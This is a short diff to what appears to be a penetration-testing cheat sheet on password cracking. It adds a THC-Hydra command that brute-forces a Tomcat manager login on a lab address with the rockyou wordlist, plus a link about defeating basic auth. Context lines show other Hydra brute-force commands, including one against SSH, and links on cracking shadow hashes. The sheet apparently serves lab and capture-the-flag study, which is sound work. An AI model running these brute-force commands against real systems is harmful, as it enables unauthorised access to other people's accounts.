@@ -3,6 +3,7 @@
 * **THC-Hydra**
 
         $ hydra -l username -P password_file.txt -s port -f ip_address request_method /path
+        $ hydra -L tomcat_username.lst -P /home/kali/Documents/lab/wordlist/rockyou.txt -s 8080 -f 10.10.10.4 http-get /manager/html
         $ hydra -l john -P rockyou.txt -t 6 ssh://10.10.10.NNN
 
 * **HashCat**
@@ -72,3 +73,4 @@
 * https://code.google.com/archive/p/findmyhash/
 * http://manpages.ubuntu.com/manpages/bionic/man8/unshadow.8.html
 * https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
+* http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
